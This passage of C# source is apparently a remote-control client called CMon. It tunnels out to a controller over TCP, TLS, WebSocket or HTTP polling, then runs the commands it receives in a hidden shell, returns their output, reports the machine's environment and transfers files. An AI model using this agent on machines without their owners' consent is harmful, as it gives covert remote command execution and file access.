    /// send a control hello), so a successful probe leaves no second session
    /// behind; the caller can switch on its next reconnect.
    /// </summary>
    public static bool ProbeWebSocket(string host, int port, string scheme, string? token = null)
    {
        var key = new CacheEntry(host.ToLowerInvariant(), port,
            (scheme ?? "auto").ToLowerInvariant(), "", 0);
        foreach (var candidate in Candidates(host, port, scheme ?? "auto")
                     .Where(candidate => candidate.Kind is "ws" or "wss"))
        {
            Conn? conn = null;
            try
            {
                conn = OpenCandidate(candidate, host, "control", token);
                conn.Close();
                Remember(key, candidate);
                return true;
            }
            catch
            {
                try { conn?.Close(); } catch { }
            }
        }
        return false;
    }

    private static bool Allowed(string kind) => kind switch
    {
        "ws" or "wss" => !HttpWire.EnvDisabled("CMON_DISABLE_WS"),
        "stream" or "streams" => !HttpWire.EnvDisabled("CMON_DISABLE_STREAM"),
        "half" or "halfs" => !HttpWire.EnvDisabled("CMON_DISABLE_HALF"),
        "poll" or "polls" => !HttpWire.EnvDisabled("CMON_DISABLE_POLL"),
        "tcp" or "tls" => !HttpWire.EnvDisabled("CMON_DISABLE_TCP"),
        _ => true
    };

    private static CacheEntry? Cached(CacheEntry key)
    {
        lock (CacheLock)
            return _cache != null && _cache.Host == key.Host && _cache.Port == key.Port
                   && _cache.Scheme == key.Scheme ? _cache : null;
    }

    private static void Remember(CacheEntry key, Candidate candidate)
    {
        lock (CacheLock) _cache = key with { Kind = candidate.Kind, BestPort = candidate.Port };
    }

    private static Conn OpenCandidate(Candidate candidate, string host, string role, string? token)
    {
        switch (candidate.Kind)
        {
            case "tcp":
            {
                var sock = NetUtil.ConnectTarget(host, candidate.Port);
                try
                {
                    NetUtil.TuneSocket(sock);
                    var conn = new SocketConn(sock, null, "tcp");
                    RawHandshake(conn, role, token);
                    return conn;
                }
                catch
                {
                    try { sock.Dispose(); } catch { }
                    throw;
                }
            }
            case "tls":
            {
                var sock = NetUtil.ConnectTarget(host, candidate.Port);
                try
                {
                    NetUtil.TuneSocket(sock);
                    // Private/LAN addresses still accept the controller's
                    // self-signed certificate inside Tls.WrapClientTls, but a
                    // public hostname must be verified normally.
                    var ssl = Tls.WrapClientTls(sock, host);
                    var conn = new SocketConn(sock, ssl, "tls");
                    RawHandshake(conn, role, token);
                    return conn;
                }
                catch
                {
                    try { sock.Dispose(); } catch { }
                    throw;
                }
            }
            case "ws":
                return WsConnect(host, candidate.Port,
                    role == "shell" ? "/shell" : "/tunnel", false, token);
            case "wss":
                return WsConnect(host, candidate.Port,
                    role == "shell" ? "/shell" : "/tunnel", true, token);
            case "stream":
                return HttpConnect(host, candidate.Port,
                    role == "shell" ? "/shell" : "/tunnel", false, token);
            case "streams":
                return HttpConnect(host, candidate.Port,
                    role == "shell" ? "/shell" : "/tunnel", true, token);
            case "half":
                return HalfConnect(host, candidate.Port, false, role, token);
            case "halfs":
                return HalfConnect(host, candidate.Port, true, role, token);
            case "poll":
                return PollConnect(host, candidate.Port, false, role, token);
            case "polls":
                return PollConnect(host, candidate.Port, true, role, token);
            default:
                throw new TransportNotSupportedException($"unknown transport {candidate.Kind}");
        }
    }

    public static void RecvHelloAck(Conn conn, double timeout = Cfg.HelloAckTimeout)
    {
        var hello = new JsonObject
        {
            ["type"] = "hello",
            ["env"] = ScreenCapture.EnvironmentReport()
        };
        Protocol.SendMsg(conn, hello);
        var msg = Protocol.RecvMsg(conn,
            DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + timeout);
        Log.Info($"[hello] reply={(msg == null ? "null" : JsonUtil.Str(msg, "type") ?? "?")} " +
                 $"transport={conn.Name}");
        if (msg == null || JsonUtil.Str(msg, "type") != "hello_ack")
            throw new TransportSoftException("controller did not acknowledge the tunnel handshake");
    }

    private static Conn WsConnect(string host, int port, string path, bool useTls, string? token)
    {
        var socket = NetUtil.ConnectTarget(host, port);
        Stream stream = new NetworkStream(socket, ownsSocket: false);
        try
        {
            NetUtil.TuneSocket(socket);
            if (useTls)
            {
                socket.ReceiveTimeout = Cfg.HttpHandshakeTimeout * 1000;
                stream = Tls.WrapClientTls(socket, host);
            }
            var key = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
            var query = string.IsNullOrEmpty(token) ? "" : "?token=" + Uri.EscapeDataString(token);
            var lines = new List<string>
            {
                $"GET {path}{query} HTTP/1.1",
                $"Host: {NetUtil.HostHeader(host, port)}",
                "Upgrade: websocket",
                "Connection: Upgrade",
                $"Sec-WebSocket-Key: {key}",
                "Sec-WebSocket-Version: 13",
                $"Sec-WebSocket-Protocol: {Cfg.CmonWsProtocol}"
            };
            lines.AddRange(TunnelHeaders.Build(host, token));
            lines.Add("");
            lines.Add("");
            socket.SendTimeout = Cfg.HttpHandshakeTimeout * 1000;
            stream.WriteTimeout = Cfg.HttpHandshakeTimeout * 1000;
            stream.Write(Encoding.Latin1.GetBytes(string.Join("\r\n", lines)));
            var (head, extra) = HttpWire.ReadHead(stream);
            var (code, parts, status) = HttpWire.ParseStatus(head);
            if (HttpWire.IsTunnelNotReady(code))
                throw new TransportTunnelNotReadyException(
                    $"tunnel returned HTTP {code}; the controller is not ready yet");
            if (code != 101)
                throw new TransportNotSupportedException(
                    $"WebSocket upgrade returned HTTP {code} {string.Join(' ', status.Skip(2))}");
            var headers = HttpWire.Headers(parts.Skip(1));
            if (!headers.GetValueOrDefault("sec-websocket-accept", "")
                    .Equals(WsAccept(key), StringComparison.Ordinal))
                throw new TransportNotSupportedException("incorrect Sec-WebSocket-Accept");
            var selected = headers.GetValueOrDefault("sec-websocket-protocol", "");
            if (!string.IsNullOrEmpty(selected) && selected != Cfg.CmonWsProtocol)
                throw new TransportNotSupportedException(
                    $"WebSocket subprotocol '{selected}' is not supported");
            stream.ReadTimeout = Timeout.Infinite;
            stream.WriteTimeout = Timeout.Infinite;
            return new WebSocketTunnel(stream, socket, false, extra, "ws-" + path.Trim('/'));
        }
        catch
        {
            try { stream.Dispose(); } catch { }
            try { socket.Dispose(); } catch { }
            throw;
        }
    }

    private static string WsAccept(string key)
    {
        var sha = SHA1.HashData(Encoding.ASCII.GetBytes(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"));
        return Convert.ToBase64String(sha);
    }

    private static Conn HttpConnect(string host, int port, string path, bool useTls, string? token)
    {
        var socket = NetUtil.ConnectTarget(host, port);
        Stream stream = new NetworkStream(socket, ownsSocket: false);
        try
        {
            NetUtil.TuneSocket(socket);
            if (useTls)
            {
                socket.ReceiveTimeout = Cfg.HttpHandshakeTimeout * 1000;
                stream = Tls.WrapClientTls(socket, host);
            }
            var request = new List<string>
            {
                $"POST {path} HTTP/1.1",
                $"Host: {NetUtil.HostHeader(host, port)}",
                "Content-Type: application/octet-stream",
                "Transfer-Encoding: chunked",
                "Connection: keep-alive"
            };
            request.AddRange(TunnelHeaders.Build(host, token));
            request.Add("");
            request.Add("");
            stream.WriteTimeout = Cfg.HttpHandshakeTimeout * 1000;
            stream.Write(Encoding.Latin1.GetBytes(string.Join("\r\n", request)));
            var (head, extra) = HttpWire.ReadHead(stream);
            var (code, lines, status) = HttpWire.ParseStatus(head);
            if (HttpWire.IsTunnelNotReady(code))
                throw new TransportTunnelNotReadyException(
                    $"tunnel returned HTTP {code}; the controller is not ready yet");
            if (code != 200)
                throw new TransportNotSupportedException(
                    $"controller returned HTTP {code} {string.Join(' ', status.Skip(2))}");
            var headers = HttpWire.Headers(lines.Skip(1));
            var tokens = (headers.GetValueOrDefault("transfer-encoding") ?? "")
                .ToLowerInvariant().Split(',', StringSplitOptions.RemoveEmptyEntries)
                .Select(x => x.Trim()).ToList();
            if (tokens.Count == 0 || tokens[^1] != "chunked"
                || tokens.Take(tokens.Count - 1).Any(x => x is not ("identity" or "chunked")))
                throw new TransportNotSupportedException("controller response is not chunked");
            var encoding = (headers.GetValueOrDefault("content-encoding") ?? "").Trim().ToLowerInvariant();
            if (encoding is not ("" or "identity"))
                throw new TransportNotSupportedException(
                    $"controller/proxy compressed the tunnel ({encoding})");
            stream.ReadTimeout = Timeout.Infinite;
            stream.WriteTimeout = Timeout.Infinite;
            return new HttpTunnel(stream, socket, extra, "http-" + path.Trim('/'));
        }
        catch
        {
            try { stream.Dispose(); } catch { }
            try { socket.Dispose(); } catch { }
            throw;
        }
    }

    private static Conn HalfConnect(string host, int port, bool useTls, string role, string? token)
    {
        var sid = role == "shell" && !string.IsNullOrEmpty(token) ? token : RandomToken();
        var socket = NetUtil.ConnectTarget(host, port);
        Stream stream = new NetworkStream(socket, ownsSocket: false);
        try
        {
            NetUtil.TuneSocket(socket);
            if (useTls)
            {
                socket.ReceiveTimeout = Cfg.HttpHandshakeTimeout * 1000;
                stream = Tls.WrapClientTls(socket, host);
            }
            var version = HttpWire.EnvDisabled("CMON_FORCE_HTTP10") ? "HTTP/1.0" : "HTTP/1.1";
            var lines = new List<string>
            {
                $"GET /down?session={Uri.EscapeDataString(sid)} {version}",
                $"Host: {NetUtil.HostHeader(host, port)}",
                "Connection: keep-alive",
                $"X-CMon-Session: {sid}"
            };
            lines.AddRange(TunnelHeaders.Build(host, token, role));
            lines.Add("");
            lines.Add("");
            stream.WriteTimeout = Cfg.HttpHandshakeTimeout * 1000;
            stream.Write(Encoding.Latin1.GetBytes(string.Join("\r\n", lines)));
            var (head, extra) = HttpWire.ReadHead(stream);
            var (code, parts, status) = HttpWire.ParseStatus(head);
            if (HttpWire.IsTunnelNotReady(code))
                throw new TransportTunnelNotReadyException(
                    $"tunnel returned HTTP {code}; the controller is not ready yet");
            if (code != 200)
                throw new TransportNotSupportedException(
                    $"GET /down returned {(status.Length >= 2 ? string.Join(' ', status.Take(2)) : "no response")}");
            var headers = HttpWire.Headers(parts.Skip(1));
            stream.ReadTimeout = Timeout.Infinite;
            var reader = new BodyStream(stream, headers, extra);
            return new HalfTunnelClient(socket, reader, sid, host, port, useTls, role, token);
        }
        catch
        {
            try { stream.Dispose(); } catch { }
            try { socket.Dispose(); } catch { }
            throw;
        }
    }

    private static Conn PollConnect(string host, int port, bool useTls, string role, string? token)
    {
        var sid = role == "shell" && !string.IsNullOrEmpty(token) ? token : RandomToken();
        var path = $"/poll/down?session={Uri.EscapeDataString(sid)}&ack=0&wait=0&role={Uri.EscapeDataString(role)}";
        if (!string.IsNullOrEmpty(token)) path += "&token=" + Uri.EscapeDataString(token);
        var (code, _, initial) = PollTunnelClient.PollRequest(host, port, useTls, "GET", path,
            Array.Empty<byte>(), Cfg.HttpHandshakeTimeout + 5);
        if (HttpWire.IsTunnelNotReady(code))
            throw new TransportTunnelNotReadyException(
                $"tunnel returned HTTP {code}; the controller is not ready yet");
        if (code != 200) throw new TransportNotSupportedException($"poll session returned HTTP {code}");
        return new PollTunnelClient(host, port, useTls, sid, role, token, initial);
    }

    private static string RandomToken()
        => Convert.ToBase64String(RandomNumberGenerator.GetBytes(18))
            .Replace('+', '-').Replace('/', '_').TrimEnd('=');

    private static void RawHandshake(Conn conn, string role, string? token)
    {
        string line;
        if (role == "shell")
        {
            if (string.IsNullOrEmpty(token))
                throw new TransportNotSupportedException("shell token is missing");
            line = $"CMON2 SHELL {token}\n";
        }
        else line = "CMON2\n";
        conn.WriteAll(Encoding.ASCII.GetBytes(line));
        var data = new List<byte>();
        var one = new byte[1];
        while (true)
        {
            if (conn.Read(one, 0, 1, Cfg.RawHandshakeTimeout * 1000) <= 0)
                throw new TransportSoftException("controller closed during CMON2 handshake");
            data.Add(one[0]);
            if (one[0] == '\n') break;
            if (data.Count > 512)
                throw new TransportNotSupportedException("CMON2 acknowledgement is too long");
        }
        var ack = Encoding.ASCII.GetString(data.ToArray());
        if (!ack.StartsWith("CMON2 OK", StringComparison.Ordinal))
            throw new TransportNotSupportedException($"unexpected CMON2 acknowledgement: {ack}");
    }

    public static Conn ConnectShell(string host, int port, string scheme, string? token,
        CancellationToken cancel)
    {
        var deadline = DateTime.UtcNow.AddSeconds(25);
        Exception? last = null;
        while (true)
        {
            if (cancel.IsCancellationRequested) throw new IOException("shell cancelled");
            try
            {
                var conn = OpenControllerConnection(host, port, scheme, "shell", token);
                if (cancel.IsCancellationRequested) { conn.Close(); throw new IOException("shell cancelled"); }
                return conn;
            }
            catch (Exception ex)
            {
                last = ex;
                if (cancel.IsCancellationRequested) throw new IOException("shell cancelled");
                if (DateTime.UtcNow >= deadline)
                    throw new IOException($"could not open the shell channel: {last?.Message}");
                Thread.Sleep(250);
            }
        }
    }
}

// ===== Commands.cs =====
// Commands.cs - persistent `cd`, shell execution, output collection, command
// cancellation, the bounded deferred-request queue and the cancellation
// registry.  Networking semantics are intentionally the same as client.py.



public static class DeferredRequests
{
    private static readonly object Gate = new();
    private static readonly List<JsonObject> Items = new();

    public static int Count { get { lock (Gate) return Items.Count; } }

    public static void Clear() { lock (Gate) Items.Clear(); }

    public static JsonObject? Pop()
    {
        lock (Gate)
        {
            if (Items.Count == 0) return null;
            var item = Items[0];
            Items.RemoveAt(0);
            return item;
        }
    }

    public static bool TryAdd(JsonObject msg)
    {
        lock (Gate)
        {
            if (Items.Count >= Cfg.MaxDeferred) return false;
            long queued = 0;
            foreach (var item in Items) queued += JsonUtil.MessageWeight(item);
            var weight = JsonUtil.MessageWeight(msg);
            if (queued + weight > Cfg.MaxDeferredBytes) return false;
            Items.Add(msg);
            return true;
        }
    }
}

public static class Cancellations
{
    private static readonly object Gate = new();
    private static readonly Dictionary<string, (JsonNode? Id, string Why)> Entries = new();
    private static readonly List<string> Order = new();

    public static string? Key(JsonNode? id)
    {
        if (id is not JsonValue value) return null;
        if (value.TryGetValue<string>(out var s)) return "s:" + s;
        if (value.TryGetValue<bool>(out var b)) return b ? "n:1" : "n:0";
        if (value.TryGetValue<long>(out var l)) return "n:" + l.ToString(CultureInfo.InvariantCulture);
        if (value.TryGetValue<double>(out var d))
        {
            if (!double.IsFinite(d)) return "f:" + d.ToString("R", CultureInfo.InvariantCulture);
            if (Math.Truncate(d) == d && d >= long.MinValue && d <= long.MaxValue)
                return "n:" + ((long)d).ToString(CultureInfo.InvariantCulture);
            return "f:" + d.ToString("R", CultureInfo.InvariantCulture);
        }
        return null;
    }

    public static void Mark(JsonNode? id, string why = "Ctrl+Z")
    {
        var key = Key(id);
        if (key == null) return;
        lock (Gate)
        {
            if (!Entries.ContainsKey(key)) Order.Add(key);
            Entries[key] = (id?.DeepClone(), why);
            if (Order.Count > 512)
            {
                foreach (var old in Order.Take(64).ToList())
                {
                    Entries.Remove(old);
                    Order.Remove(old);
                }
            }
        }
    }

    public static bool IsCanceled(JsonNode? id)
    {
        var key = Key(id);
        if (key == null) return false;
        lock (Gate) return Entries.ContainsKey(key);
    }

    public static string? Forget(JsonNode? id)
    {
        var key = Key(id);
        if (key == null) return null;
        lock (Gate)
        {
            if (!Entries.TryGetValue(key, out var entry)) return null;
            Entries.Remove(key);
            Order.Remove(key);
            return entry.Why;
        }
    }

    public static void Clear()
    {
        lock (Gate) { Entries.Clear(); Order.Clear(); }
    }
}

public static class Commands
{
    private const int SigHup = 1;
    private const int SigTerm = 15;
    private const int SigKill = 9;

    public static string? PrevDir;

    private static int _busy;
    public static bool Busy => Volatile.Read(ref _busy) != 0;
    public static void SetBusy(bool value) => Volatile.Write(ref _busy, value ? 1 : 0);

    // ------------------------------------------------------------------
    // change_dir
    // ------------------------------------------------------------------

    public static (string NewDir, string? Output)? ChangeDir(string command, string currentDir)
    {
        var cmd = command.Trim();
        var low = cmd.ToLowerInvariant();
        if (low != "cd" && !low.StartsWith("cd ", StringComparison.Ordinal)) return null;
        if (cmd.Contains("&&") || cmd.Contains("||") || cmd.Contains(';') || cmd.Contains('|'))
            return null;

        var target = cmd.Length > 2 ? cmd[2..].Trim() : "";
        if (Platform.IsWindows && target.StartsWith("/d ", StringComparison.OrdinalIgnoreCase))
            target = target[3..].Trim();
        if (!Platform.IsWindows && target.Length > 0)
        {
            try
            {
                var parts = ShlexSplit(target);
                if (parts.Count == 1) target = parts[0];
            }
            catch (FormatException)
            {
                if (target.Length >= 2 && target[0] == target[^1]
                    && (target[0] == '"' || target[0] == '\''))
                    target = target[1..^1];
            }
        }
        else if (target.Length >= 2 && target[0] == target[^1]
                 && (target[0] == '"' || target[0] == '\''))
        {
            target = target[1..^1];
        }

        if (target.Length == 0) return (currentDir, currentDir);

        target = ExpandVars(ExpandUser(target));
        if (target == "-")
        {
            if (!string.IsNullOrEmpty(PrevDir) && Directory.Exists(PrevDir))
            {
                var newDir = PrevDir;
                PrevDir = currentDir;
                return (newDir, newDir);
            }
            return (currentDir, "cd: OLDPWD not set");
        }

        string newPath;
        try
        {
            newPath = Path.IsPathRooted(target)
                ? Path.GetFullPath(target)
                : Path.GetFullPath(Path.Combine(currentDir, target));
        }
        catch
        {
            return (currentDir, $"cd: {target}: No such file or directory");
        }
        if (Directory.Exists(newPath))
        {
            PrevDir = currentDir;
            return (newPath, null);
        }
        if (File.Exists(newPath))
            return (currentDir, $"cd: {target}: Not a directory");
        return (currentDir, $"cd: {target}: No such file or directory");
    }

    private static List<string> ShlexSplit(string value)
    {
        // POSIX shlex.split with comments=False and posix=True: enough of it
        // to handle the quoting people use for cd arguments.
        var parts = new List<string>();
        var current = new StringBuilder();
        var have = false;
        var i = 0;
        while (i < value.Length)
        {
            var ch = value[i];
            if (char.IsWhiteSpace(ch))
            {
                if (have) { parts.Add(current.ToString()); current.Clear(); have = false; }
                i++;
                continue;
            }
            have = true;
            if (ch == '\'')
            {
                i++;
                while (i < value.Length && value[i] != '\'') current.Append(value[i++]);
                if (i >= value.Length) throw new FormatException("No closing quotation");
                i++;
                continue;
            }
            if (ch == '"')
            {
                i++;
                while (i < value.Length && value[i] != '"')
                {
                    if (value[i] == '\\' && i + 1 < value.Length
                        && value[i + 1] is '"' or '\\' or '$' or '`' or '\n')
                    {
                        if (value[i + 1] != '\n') current.Append(value[i + 1]);
                        i += 2;
                    }
                    else current.Append(value[i++]);
                }
                if (i >= value.Length) throw new FormatException("No closing quotation");
                i++;
                continue;
            }
            if (ch == '\\')
            {
                if (i + 1 < value.Length)
                {
                    if (value[i + 1] != '\n') current.Append(value[i + 1]);
                    i += 2;
                }
                else i++;
                continue;
            }
            current.Append(ch);
            i++;
        }
        if (have) parts.Add(current.ToString());
        return parts;
    }

    private static string ExpandUser(string value)
    {
        if (!value.StartsWith('~')) return value;
        var slash = value.IndexOfAny(new[] { '/', '\\' });
        var name = slash < 0 ? value[1..] : value[1..slash];
        var rest = slash < 0 ? "" : value[slash..];
        string? home = null;
        if (name.Length == 0)
            home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        else
        {
            try
            {
                if (Platform.IsWindows)
                {
                    // Python's ntpath.expanduser uses USERPROFILE only for the
                    // current account; unknown names are left untouched.
                    var user = Environment.UserName;
                    if (string.Equals(name, user, StringComparison.OrdinalIgnoreCase))
                        home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                }
                else
                {
                    foreach (var line in File.ReadLines("/etc/passwd"))
                    {
                        var fields = line.Split(':');
                        if (fields.Length >= 6 && fields[0] == name) { home = fields[5]; break; }
                    }
                }
            }
            catch { }
        }
        if (string.IsNullOrEmpty(home)) return value;
        return home + rest;
    }

    private static string ExpandVars(string value)
    {
        var output = new StringBuilder();
        var i = 0;
        while (i < value.Length)
        {
            var ch = value[i];
            if (Platform.IsWindows && ch == '%')
            {
                var end = value.IndexOf('%', i + 1);
                if (end > i + 1)
                {
                    var name = value[(i + 1)..end];
                    if (name.Length > 0 && name.All(c => c == '_' || char.IsLetterOrDigit(c)))
                    {
                        output.Append(Environment.GetEnvironmentVariable(name) ?? "");
                        i = end + 1;
                        continue;
                    }
                }
            }
            if (ch == '$' && i + 1 < value.Length)
            {
                if (value[i + 1] == '{')
                {
                    var end = value.IndexOf('}', i + 2);
                    if (end > i + 2)
                    {
                        var name = value[(i + 2)..end];
                        output.Append(Environment.GetEnvironmentVariable(name) ?? "");
                        i = end + 1;
                        continue;
                    }
                }
                else if (IsVarStart(value[i + 1]))
                {
                    var end = i + 2;
                    while (end < value.Length && IsVarPart(value[end])) end++;
                    var name = value[(i + 1)..end];
                    output.Append(Environment.GetEnvironmentVariable(name) ?? "");
                    i = end;
                    continue;
                }
            }
            output.Append(ch);
            i++;
        }
        return output.ToString();
    }

    private static bool IsVarStart(char ch) => ch == '_' || char.IsLetter(ch);
    private static bool IsVarPart(char ch) => ch == '_' || char.IsLetterOrDigit(ch);

    // ------------------------------------------------------------------
    // run_command
    // ------------------------------------------------------------------

    public static (string Text, bool Stop, int? ExitCode) RunCommand(
        Conn conn, string command, string currentDir, JsonNode? reqId)
    {
        Process? proc = null;
        try
        {
            proc = StartCommand(command, currentDir);
        }
        catch (Exception ex)
        {
            return (ex.Message, false, 127);
        }

        if (proc == null) return ("", false, 127);

        var chunks = new List<byte[]>();
        var outputGate = new object();
        var size = 0;
        var lastData = Environment.TickCount64;
        var stopReader = false;
        var readers = Platform.IsWindows ? new CountdownEvent(2) : new CountdownEvent(1);
        void Append(byte[] data, int count)
        {
            Volatile.Write(ref lastData, Environment.TickCount64);
            lock (outputGate)
            {
                if (size < Cfg.MaxOutput)
                {
                    var copy = new byte[count];
                    Buffer.BlockCopy(data, 0, copy, 0, count);
                    chunks.Add(copy);
                    size += count;
                }
            }
        }
        void Reader(Stream stream)
        {
            var buffer = new byte[65536];
            try
            {
                while (!Volatile.Read(ref stopReader))
                {
                    var n = stream.Read(buffer, 0, buffer.Length);
                    if (n <= 0) break;
                    Append(buffer, n);
                }
            }
            catch (Exception ex) when (ex is IOException or ObjectDisposedException or NotSupportedException) { }
            finally { try { readers.Signal(); } catch { } }
        }

        var stdoutThread = new Thread(() => Reader(proc.StandardOutput.BaseStream))
        { IsBackground = true, Name = "command-stdout" };
        stdoutThread.Start();
        Thread? stderrThread = null;
        if (Platform.IsWindows)
        {
            stderrThread = new Thread(() => Reader(proc.StandardError.BaseStream))
            { IsBackground = true, Name = "command-stderr" };
            stderrThread.Start();
        }
        try { proc.StandardInput.Close(); } catch { }

        var killed = false;
        var truncated = false;
        var stop = false;
        var disconnected = false;
        var killWhy = "Ctrl+Z";
        long? shellExitedAt = null;
        var cleanExit = false;
        int? exitCode = null;

        try
        {
            while (true)
            {
                if (size >= Cfg.MaxOutput && !truncated) truncated = true;
                var exited = proc.HasExited;
                if (exited)
                {
                    shellExitedAt ??= Environment.TickCount64;
                    var now = Environment.TickCount64;
                    if (readers.IsSet
                        || now - Volatile.Read(ref lastData) > 500
                        || now - shellExitedAt.Value > 2000)
                    {
                        cleanExit = true;
                        break;
                    }
                }

                var readable = conn.WaitReadable(20);
                if (readable)
                {
                    var msg = Protocol.RecvMsg(conn);
                    if (msg == null)
                    {
                        KillProcess(proc);
                        disconnected = true;
                        break;
                    }
                    var mtype = JsonUtil.Str(msg, "type");
                    if (mtype == "cancel")
                    {
                        var target = JsonUtil.Get(msg, "id");
                        var why = JsonUtil.Str(msg, "why") ?? "Ctrl+Z";
                        if (target == null || ReqIdEquals(target, reqId))
                        {
                            killWhy = why;
                            KillProcess(proc);
                            killed = true;
                        }
                        else
                        {
                            Cancellations.Mark(target, why);
                            var state = Transfers.IncomingDrop(target);
                            state?.Abort(new JsonObject { ["reason"] = why });
                            Transfers.OutgoingCancel(target);
                        }
                    }
                    else if (mtype == "cmd_kill")
                    {
                        KillProcess(proc);
                        killed = true;
                    }
                    else if (mtype == "screenshare_stop")
                    {
                        ScreenCapture.StopStream(0.5);
                    }
                    else if (mtype == "exit")
                    {
                        KillProcess(proc);
                        stop = true;
                        break;
                    }
                    else if (mtype is "transfer_begin" or "transfer_entries"
                             or "transfer_file_begin" or "transfer_chunk"
                             or "transfer_file_end" or "transfer_abort"
                             or "transfer_end")
                    {
                        Transfers.HandleTransferMessage(conn, msg, JsonUtil.Get(msg, "id"), currentDir);
                    }
                    else if (mtype == "download")
                    {
                        Transfers.ServeDownloadRequest(conn, msg, JsonUtil.Get(msg, "id"), currentDir);
                    }
                    else
                    {
                        if (!DeferredRequests.TryAdd(msg))
                        {
                            var deferredId = JsonUtil.Get(msg, "id");
                            if (JsonUtil.IsValidReqId(deferredId))
                            {
                                try
                                {
                                    Protocol.SendMsg(conn, new JsonObject
                                    {
                                        ["type"] = "error",
                                        ["id"] = deferredId?.DeepClone(),
                                        ["data"] = "client busy: request queue is full"
                                    });
                                }
                                catch (IOException) { }
                                catch (ObjectDisposedException) { }
                            }
                        }
                    }
                }
            }
        }
        finally
        {
            if (cleanExit && !(killed || disconnected || stop))
                CleanupLeftoverGroup(proc.Id);
            Volatile.Write(ref stopReader, true);
            try { stdoutThread.Join(1500); } catch { }
            try { stderrThread?.Join(1500); } catch { }
            try { proc.StandardOutput.Close(); } catch { }
            try { proc.StandardError.Close(); } catch { }
        }

        if (cleanExit && !(killed || disconnected || stop))
        {
            try { exitCode = proc.ExitCode; }
            catch { exitCode = null; }
        }

        string text;
        lock (outputGate)
        {
            using var stream = new MemoryStream();
            foreach (var chunk in chunks) stream.Write(chunk, 0, chunk.Length);
            text = DecodeOutput(stream.ToArray());
        }

        var notes = new List<string>();
        if (killed)
            notes.Add($"[client] command stopped by the controller ({killWhy})");
        if (disconnected)
            notes.Add("[client] controller disconnected - command stopped");
        if (truncated)
            notes.Add("[client] output cut off after " +
                      Math.Round(Cfg.MaxOutput / (1024.0 * 1024.0), 2)
                          .ToString("G", CultureInfo.InvariantCulture) +
                      " MB (the command kept running)");
        if (notes.Count > 0)
        {
            if (text.Length > 0 && !text.EndsWith('\n')) text += "\n";
            text += string.Join("\n", notes);
        }

        try { proc.Dispose(); } catch { }
        return (text, stop, exitCode);
    }

    private static Process StartCommand(string command, string currentDir)
    {
        ProcessStartInfo psi;
        if (Platform.IsWindows)
        {
            var comspec = Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
            psi = new ProcessStartInfo
            {
                FileName = comspec,
                WorkingDirectory = currentDir,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            psi.ArgumentList.Add("/d");
            psi.ArgumentList.Add("/s");
            psi.ArgumentList.Add("/c");
            psi.ArgumentList.Add(command);
        }
        else
        {
            var shell = Platform.ShellExecutable();
            if (string.IsNullOrEmpty(shell)) shell = "/bin/sh";
            // The helper calls setsid() and then exec()s the shell, so the
            // Process id is both the session and process-group id. That makes
            // cancellation of the whole tree reliable without an external
            // setsid(1) binary (macOS has none).
            psi = SelfExec.StartInfo("--cmon-exec", shell, "-c", "exec 2>&1; " + command);
            psi.WorkingDirectory = currentDir;
            psi.RedirectStandardInput = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = false;
        }
        var proc = new Process { StartInfo = psi };
        if (!proc.Start()) throw new IOException("could not start command shell");
        return proc;
    }

    private static bool ReqIdEquals(JsonNode? left, JsonNode? right)
    {
        if (left == null || right == null) return left == null && right == null;
        if (left is not JsonValue lv || right is not JsonValue rv) return false;
        var leftString = lv.TryGetValue<string>(out var ls);
        var rightString = rv.TryGetValue<string>(out var rs);
        if (leftString || rightString)
            return leftString && rightString && ls == rs;
        if (TryNumber(lv, out var ln) && TryNumber(rv, out var rn)) return ln == rn;
        return false;
    }

    private static bool TryNumber(JsonValue value, out double number)
    {
        if (value.TryGetValue<bool>(out var b)) { number = b ? 1 : 0; return true; }
        if (value.TryGetValue<long>(out var l)) { number = l; return true; }
        if (value.TryGetValue<double>(out var d)) { number = d; return true; }
        number = 0;
        return false;
    }

    private static string DecodeOutput(byte[] data)
    {
        if (data.Length == 0) return "";
        if (Platform.IsWindows)
        {
            try
            {
                return new UTF8Encoding(false, true).GetString(data);
            }
            catch (DecoderFallbackException)
            {
                try
                {
                    var codePage = (int)Kernel32.GetOEMCP();
                    var chars = new char[data.Length + 1];
                    var count = Kernel32.MultiByteToWideChar((uint)codePage, 0,
                        data, data.Length, chars, chars.Length);
                    return count > 0 ? new string(chars, 0, count) : Encoding.UTF8.GetString(data);
                }
                catch
                {
                    return Encoding.UTF8.GetString(data);
                }
            }
        }
        return Encoding.UTF8.GetString(data);
    }

    // ------------------------------------------------------------------
    // Process-tree cancellation (POSIX) and taskkill (Windows)
    // ------------------------------------------------------------------

    public static void KillProcess(Process proc)
    {
        if (proc.HasExited)
        {
            // `cmd &` children may still be alive and holding the output pipe.
            KillOrphanGroup(proc.Id);
            return;
        }
        if (Platform.IsWindows)
        {
            try
            {
                if (RunQuietCode("taskkill", new[] { "/F", "/T", "/PID", proc.Id.ToString(CultureInfo.InvariantCulture) }, 10) == 0)
                    return;
            }
            catch { }
            try { proc.Kill(true); } catch { }
            return;
        }

        int group;
        try { group = Posix.getpgid(proc.Id); }
        catch { group = -1; }
        foreach (var (sig, grace) in new[] { (SigTerm, 1.0), (SigKill, 2.0) })
        {
            var ok = group >= 0
                ? Posix.killpg(group, sig) == 0
                : Posix.kill(proc.Id, sig) == 0;
            if (!ok) return;
            try
            {
                if (proc.WaitForExit((int)(grace * 1000))) return;
            }
            catch { return; }
        }
    }

    private static void KillOrphanGroup(int pid)
    {
        if (Platform.IsWindows) return;
        foreach (var (sig, pause) in new[] { (SigTerm, 0.05), (SigKill, 0.0) })
        {
            Posix.killpg(pid, sig);
            SignalSession(pid, sig);
            if (pause > 0) Thread.Sleep(TimeSpan.FromSeconds(pause));
        }
    }

    private static void SignalSession(int sessionId, int sig)
    {
        if (Platform.IsWindows) return;
        if (Directory.Exists("/proc"))
        {
            IEnumerable<string> entries;
            try { entries = Directory.EnumerateDirectories("/proc"); }
            catch { entries = Array.Empty<string>(); }
            foreach (var entry in entries)
            {
                var name = Path.GetFileName(entry);
                if (name.Length == 0 || !name.All(char.IsDigit)) continue;
                try
                {
